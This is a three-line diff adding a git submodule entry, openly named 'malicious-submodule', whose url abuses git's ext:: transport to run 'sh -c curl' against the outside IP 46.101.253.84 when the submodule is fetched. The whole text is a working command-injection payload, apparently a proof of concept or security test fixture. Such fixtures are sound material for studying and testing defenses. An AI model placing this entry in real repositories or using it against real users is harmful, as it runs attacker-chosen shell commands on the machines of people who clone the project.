@@ -1,0 +1,3 @@
+[submodule "malicious-submodule"]
+    path = malicious-submodule
+    url = "ext::sh -c curl% 46.101.253.84:8080/test >&2"
